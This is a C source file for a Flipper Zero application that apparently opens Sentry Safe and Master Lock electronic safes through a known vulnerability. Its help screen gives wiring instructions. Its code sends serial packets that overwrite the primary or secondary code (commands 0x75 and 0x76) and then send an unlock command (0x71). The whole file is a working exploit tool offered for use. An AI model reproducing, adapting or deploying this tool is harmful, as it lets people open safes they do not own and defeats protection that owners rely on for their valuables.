#include <furi.h>
#include <gui/gui.h>
#include <input/input.h>
#include <gui/elements.h>
#include <stdlib.h>
#include <furi_hal.h>
#include <expansion/expansion.h>
#include <gui/canvas.h>

// Application state structure
typedef struct {
    uint8_t status;                  // 0: idle, 1: sending, 2: done
    uint8_t selected_setting;        // Selected digit or mode
    uint8_t code[5];                 // 5-digit code
    bool is_primary;                 // true = primary code, false = secondary
    bool show_help;                  // Help screen toggle
    FuriMutex* mutex;                // Mutex for thread safety
    uint8_t scroll_offset;           // Help text scroll
} SentryState;

typedef enum {
    EventTypeTick,
    EventTypeKey,
} EventType;

typedef struct {
    EventType type;
    InputEvent input;
} Event;

// Status messages shown in UI
const char* status_texts[] = {"", "Sending...", "Done !"};

// Help screen content (used when holding OK)
const char* help_lines[] = {
    "- [SENTRY SAFE OPENER] -",
    "",
    "Open safes by overwritting",
    "code with a new one, using",
    "a vulnerability.",
    "",
    "Place wires, chose code,", 
    "press OK, it's open !",
    "",
    "Supported safes :",
    "- Sentry Safe",
    "- Master Lock",
    "",
    "+-----[WIRING]-----+",
    " BLACK  <-->  GND  ",
    " GREEN  <-->  C1   ",
    "+----------------+",
    "",
    "Use arrows to select & edit",
    "'P' = Primary code",
    "'S' = Secondary code",
    "",
    "Set code to 00000 to delete",
    "",
    "Thanks to ArsLock",
    "",
    "v2.0 - @h4ckd4ddy",
    "__QR__",
    ""
};

// Static QR code bitmap (used in help screen)
static const uint8_t qr_code_github_bits[] = {
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0xf0,0x47,0xeb,0xcd,0x1f,0x00,
    0x10,0x54,0x2e,0x53,0x10,0x00,
    0xd0,0x05,0x53,0x47,0x17,0x00,
    0xd0,0x75,0x25,0x50,0x17,0x00,
    0xd0,0x25,0x90,0x49,0x17,0x00,
    0x10,0xb4,0x19,0x55,0x10,0x00,
    0xf0,0x57,0x55,0xd5,0x1f,0x00,
    0x00,0xe0,0xcc,0x06,0x00,0x00,
    0xf0,0xbd,0x20,0xb5,0x0a,0x00,
    0x70,0x4a,0x97,0x4b,0x1c,0x00,
    0x20,0x44,0x7e,0x95,0x0b,0x00,
    0x80,0x0a,0x53,0x63,0x05,0x00,
    0x60,0x66,0xad,0xa4,0x03,0x00,
    0x90,0x33,0xb0,0xd8,0x18,0x00,
    0xe0,0x87,0x59,0xf7,0x09,0x00,
    0x50,0x81,0x9c,0xe3,0x04,0x00,
    0xc0,0xa5,0xf8,0xb4,0x09,0x00,
    0xa0,0x10,0xf7,0x49,0x1a,0x00,
    0x50,0x5c,0x0e,0x62,0x0a,0x00,
    0xf0,0x39,0x9b,0x3e,0x04,0x00,
    0x00,0x4d,0x25,0x1d,0x09,0x00,
    0xf0,0x40,0x90,0x4f,0x1a,0x00,
    0x50,0xbe,0x69,0xe3,0x0a,0x00,
    0x50,0x88,0x0c,0xfb,0x07,0x00,
    0x90,0x95,0x38,0xf4,0x11,0x00,
    0x00,0x50,0xd7,0x17,0x17,0x00,
    0xf0,0x57,0x5e,0x5a,0x0b,0x00,
    0x10,0x64,0x9b,0x1a,0x1f,0x00,
    0xd0,0x55,0xa5,0xf5,0x11,0x00,
    0xd0,0x15,0xc0,0xb3,0x19,0x00,
    0xd0,0xb5,0x39,0x1e,0x06,0x00,
    0x10,0xb4,0xdc,0xce,0x06,0x00,
    0xf0,0xd7,0x28,0x15,0x0a,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00
};


// Send command and code to the safe through serial
void send_request(uint8_t command, const uint8_t* code) {
    int checksum = command + code[0] + code[1] + code[2] + code[3] + code[4];

    // Set pin to output and toggle signal
    furi_hal_gpio_init_simple(&gpio_ext_pc1, GpioModeOutputPushPull);
    furi_hal_gpio_write(&gpio_ext_pc1, false);
    furi_delay_ms(3.4);
    furi_hal_gpio_write(&gpio_ext_pc1, true);

    // Prepare and send serial packet
    FuriHalSerialHandle* serial = furi_hal_serial_control_acquire(FuriHalSerialIdLpuart);
    furi_hal_serial_init(serial, 4800);
    uint8_t data[] = {0x00, command, code[0], code[1], code[2], code[3], code[4], checksum};
    furi_hal_serial_tx(serial, data, 8);
    furi_delay_ms(100);
    furi_hal_serial_deinit(serial);
    furi_hal_serial_control_release(serial);
}

// Draw screen contents (called every frame)
static void sentry_safe_render_callback(Canvas* const canvas, void* ctx) {
    SentryState* state = ctx;
    furi_mutex_acquire(state->mutex, FuriWaitForever);
    canvas_draw_frame(canvas, 0, 0, 128, 64);

    // Title bar
    if(!state->show_help) {
        canvas_draw_frame(canvas, 24, 0, 80, 13);
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(canvas, 64, 10, AlignCenter, AlignBottom, "SENTRY SAFE");
    }

    // Help
    if(state->show_help) {
        canvas_set_font(canvas, FontSecondary);
        uint8_t y = 10;
        for(uint8_t i = state->scroll_offset; i < 29 && y < 64; ++i) {
            if(strcmp(help_lines[i], "__QR__") == 0) {
                // Draw QR code centered
                canvas_draw_xbm(canvas, 43, y, 41, 41, qr_code_github_bits);
                y += 43;
            } else {
                canvas_draw_str(canvas, 2, y, help_lines[i]);
                y += 8;
            }
        }

        // Scroll down indicator
        if(state->scroll_offset < 33 - 7) {
            canvas_draw_line(canvas, 122, 56, 126, 56);
            canvas_draw_line(canvas, 122, 56, 124, 60);
            canvas_draw_line(canvas, 126, 56, 124, 60);
        }

        // Scroll up indicator
        if(state->scroll_offset > 0) {
            canvas_draw_line(canvas, 122, 8, 126, 8);
            canvas_draw_line(canvas, 122, 8, 124, 4);
            canvas_draw_line(canvas, 126, 8, 124, 4);
        }

        furi_mutex_release(state->mutex);
        return;
    }

    // Draw main code input line
    canvas_set_font(canvas, FontSecondary);
    char line[32] = {0};
    int pos = 0;

    for(uint8_t i = 0; i < 5; i++) {
        if(i == state->selected_setting)
            pos += snprintf(line + pos, sizeof(line) - pos, "[%d]", state->code[i]);
        else
            pos += snprintf(line + pos, sizeof(line) - pos, " %d ", state->code[i]);
    }

    // Display P/S selector
    if(state->selected_setting == 5)
        pos += snprintf(line + pos, sizeof(line) - pos, "-[%c]", state->is_primary ? 'P' : 'S');
    else
        pos += snprintf(line + pos, sizeof(line) - pos, "- %c ", state->is_primary ? 'P' : 'S');

    canvas_draw_frame(canvas, 14, 20, 100, 14);

    // Show current status or code line
    if(state->status > 0) {
        canvas_draw_str_aligned(canvas, 64, 30, AlignCenter, AlignBottom, status_texts[state->status]);
    } else {
        canvas_draw_str_aligned(canvas, 64, 30, AlignCenter, AlignBottom, line);
    }

    // Bottom instructions
    canvas_draw_str_aligned(canvas, 64, 50, AlignCenter, AlignBottom, "Hold OK = Help");
    canvas_draw_str_aligned(canvas, 64, 58, AlignCenter, AlignBottom, "Press OK = Send");

    furi_mutex_release(state->mutex);
}

// Handle input events and push them to the queue
static void sentry_safe_input_callback(InputEvent* input_event, void* ctx) {
    FuriMessageQueue* event_queue = ctx;
    Event event = {.type = EventTypeKey, .input = *input_event};
    furi_message_queue_put(event_queue, &event, FuriWaitForever);
}

// Main application function
int32_t sentry_safe_app(void* p) {
    UNUSED(p);

    // Disable expansion port to use GPIO
    Expansion* expansion = furi_record_open(RECORD_EXPANSION);
    expansion_disable(expansion);

    // Create event queue and app state
    FuriMessageQueue* event_queue = furi_message_queue_alloc(8, sizeof(Event));
    SentryState* state = malloc(sizeof(SentryState));
    *state = (SentryState){
        .status = 0,
        .selected_setting = 0,
        .is_primary = true,
        .show_help = false,
        .scroll_offset = 0,
        .mutex = furi_mutex_alloc(FuriMutexTypeNormal)};
    memcpy(state->code, (uint8_t[]){1, 2, 3, 4, 5}, 5);

    // Create and configure viewport
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, sentry_safe_render_callback, state);
    view_port_input_callback_set(view_port, sentry_safe_input_callback, event_queue);

    // Attach viewport to GUI
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    Event event;
    for(bool processing = true; processing;) {
        if(furi_message_queue_get(event_queue, &event, 100) == FuriStatusOk) {
            furi_mutex_acquire(state->mutex, FuriWaitForever);

            // Help screen navigation
            if(state->show_help) {
                if(event.input.key == InputKeyBack && event.input.type == InputTypePress) {
                    state->show_help = false;
                } else if(event.input.key == InputKeyUp && state->scroll_offset > 0) {
                    state->scroll_offset--;
                } else if(event.input.key == InputKeyDown && state->scroll_offset < 33 - 7) {
                    state->scroll_offset++;
                }
                furi_mutex_release(state->mutex);
                view_port_update(view_port);
                continue;
            }

            // Main input handling
            if(event.input.type == InputTypePress) {
                switch(event.input.key) {
                case InputKeyLeft:
                    if(state->selected_setting > 0) state->selected_setting--;
                    break;
                case InputKeyRight:
                    if(state->selected_setting < 5) state->selected_setting++;
                    break;
                case InputKeyUp:
                    if(state->selected_setting < 5 && state->code[state->selected_setting] < 9) {
                        state->code[state->selected_setting]++;
                    } else if(state->selected_setting == 5) {
                        state->is_primary = true;
                    }
                    break;
                case InputKeyDown:
                    if(state->selected_setting < 5 && state->code[state->selected_setting] > 0) {
                        state->code[state->selected_setting]--;
                    } else if(state->selected_setting == 5) {
                        state->is_primary = false;
                    }
                    break;
                case InputKeyBack:
                    processing = false; // stop loop, exit app
                    break;
                default:
                    break;
                }
            } else if(event.input.key == InputKeyOk && event.input.type == InputTypeLong) {
                // Show help screen on long OK press
                state->show_help = true;
                state->scroll_offset = 0;
            } else if(event.input.key == InputKeyOk && event.input.type == InputTypeShort) {
                // Send code on short OK press
                if(state->status == 2) {
                    state->status = 0; // Reset back to Ready
                } else if(state->status == 0) {
                    state->status = 1; // Set to Sending...
                    furi_mutex_release(state->mutex);
                    view_port_update(view_port); // Update screen
                    send_request(state->is_primary ? 0x75 : 0x76, state->code); // Send code overwritecommand
                    furi_delay_ms(500);
                    send_request(0x71, state->code); // Send unlock command
                    state->status = 2;
                }
            }

            furi_mutex_release(state->mutex);
            view_port_update(view_port);
        }
    }

    // Cleanup GPIO and UI
    furi_hal_gpio_init(&gpio_ext_pc1, GpioModeAnalog, GpioPullNo, GpioSpeedLow);
    view_port_enabled_set(view_port, false);
    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    view_port_free(view_port);
    furi_message_queue_free(event_queue);
    furi_mutex_free(state->mutex);
    free(state);
    expansion_enable(expansion);
    furi_record_close(RECORD_EXPANSION);

    return 0;
}
